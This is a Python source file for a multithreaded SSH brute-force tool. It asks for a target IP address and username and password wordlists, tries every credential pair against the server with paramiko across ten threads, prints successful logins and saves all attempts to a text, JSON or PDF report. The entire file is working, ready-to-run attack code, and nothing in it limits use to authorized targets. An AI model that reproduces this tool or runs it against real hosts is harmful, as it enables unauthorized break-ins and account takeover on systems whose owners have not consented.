import paramiko
import threading
import queue
from tqdm import tqdm
import time
import json
import os
from fpdf import FPDF

# ANSI escape sequences for colors
GREEN = '\033[92m'  # Green text
RED = '\033[91m'   # Red text
RESET = '\033[0m'  # Reset to default terminal color

def update_progress(progress_bar):
    progress_lock.acquire()
    try:
        progress_bar.update(1)
    finally:
        progress_lock.release()

def attempt_login(host, port, username, password, result_queue, progress_bar, report_list):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(host, port=port, username=username, password=password, timeout=20)
        result_queue.put((username, password))
        tqdm.write(f"{GREEN}Success: {username}:{password}{RESET}")
        report_list.append({
            'Host': host,
            'Port': port,
            'Username': username,
            'Password': password,
            'Status': 'Success'
        })
    except paramiko.AuthenticationException:
        tqdm.write(f"{RED}Failed: {username}:{password}{RESET}")
        report_list.append({
            'Host': host,
            'Port': port,
            'Username': username,
            'Password': password,
            'Status': 'Failed'
        })
    except paramiko.ssh_exception.SSHException as e:
        if "Error reading SSH protocol banner" in str(e):
            tqdm.write(f"{RED}Banner read error with {username}:{password}, will retry.{RESET}")
            time.sleep(1)
            return attempt_login(host, port, username, password, result_queue, progress_bar, report_list)
    except Exception as e:
        tqdm.write(f"{RED}Error with {username}:{password} - {str(e)}{RESET}")
    finally:
        ssh_client.close()
        update_progress(progress_bar)

def worker(host, port, credentials_queue, result_queue, progress_bar, report_list):
    while not credentials_queue.empty():
        username, password = credentials_queue.get()
        attempt_login(host, port, username, password, result_queue, progress_bar, report_list)
        credentials_queue.task_done()
        

def save_report(data, file_format, file_name, directory_path):
    """Generate a report from fetched data and save it to a specific location in the chosen format."""
    file_path = os.path.join(directory_path, file_name + '.' + file_format)
    os.makedirs(directory_path, exist_ok=True)
    if file_format == 'json':
        with open(file_path, 'w') as file:
            json.dump(data, file, indent=4)
    elif file_format == 'txt':
        with open(file_path, 'w') as file:
            for entry in data:
                file.write(f"Host: {entry['Host']}, Port: {entry['Port']}, Username: {entry['Username']}, Password: {entry['Password']}, Status: {entry['Status']}\n")
    elif file_format == 'pdf':
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        column_widths = [40, 20, 40, 40, 30]  # Define column widths

        # Add header
        pdf.set_fill_color(200, 220, 255)  # Light blue fill
        pdf.cell(column_widths[0], 10, 'Host', 1, 0, 'C', 1)
        pdf.cell(column_widths[1], 10, 'Port', 1, 0, 'C', 1)
        pdf.cell(column_widths[2], 10, 'Username', 1, 0, 'C', 1)
        pdf.cell(column_widths[3], 10, 'Password', 1, 0, 'C', 1)
        pdf.cell(column_widths[4], 10, 'Status', 1, 1, 'C', 1)

        # Add data rows
        pdf.set_fill_color(255, 255, 255)  # White fill
        for entry in data:
            pdf.cell(column_widths[0], 10, entry['Host'], 1, 0, 'C')
            pdf.cell(column_widths[1], 10, str(entry['Port']), 1, 0, 'C')
            pdf.cell(column_widths[2], 10, entry['Username'], 1, 0, 'C')
            pdf.cell(column_widths[3], 10, entry['Password'], 1, 0, 'C')
            pdf.cell(column_widths[4], 10, entry['Status'], 1, 1, 'C')  # Move to next line

        pdf.output(file_path)

def run_ssh_bruteforce():
    host = input("Enter the target SSH IP address: ")
    port = int(input("Enter the SSH port (default is 22): ") or "22")
    username_file = input("Enter the path to the username wordlist: ")
    password_file = input("Enter the path to the password wordlist: ")
    
    try:
        def load_list(file_path):
            with open(file_path, 'r') as file:
                return [line.strip() for line in file]

        username_list = load_list(username_file)
        password_list = load_list(password_file)

        credentials_queue = queue.Queue()
        total_attempts = len(username_list) * len(password_list)
        for username in username_list:
            for password in password_list:
                credentials_queue.put((username.strip(), password.strip()))

        result_queue = queue.Queue()
        report_list = []

        global print_lock, progress_lock
        print_lock = threading.Lock()
        progress_lock = threading.Lock()

        progress_bar = tqdm(total=total_attempts, desc="Brute Forcing", unit="login")

        threads = []
        num_threads = 10

        for _ in range(num_threads):
            thread = threading.Thread(target=worker, args=(host, port, credentials_queue, result_queue, progress_bar, report_list))
            thread.start()
            threads.append(thread)

        credentials_queue.join()

        for thread in threads:
            thread.join()

        progress_bar.close()

        if not result_queue.empty():
            successful_login = result_queue.get()
            print(f"{GREEN}SSH credentials found: Username - {successful_login[0]}, Password - {successful_login[1]}{RESET}")
        else:
            print("No valid SSH credentials found.")
        
        # Save the report
        file_format = input("Enter the file format (txt, json, pdf): ").lower()
        if file_format not in ['txt', 'json', 'pdf']:
            print("Invalid format selected. Defaulting to txt.")
            file_format = 'txt'
        file_name = input("Enter the filename without extension: ")
        directory_path = input("Enter the directory path where you want to save the file: ")
        save_report(report_list, file_format, file_name, directory_path)
        
    except FileNotFoundError:
        print("File not found. Check the file path and try again.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

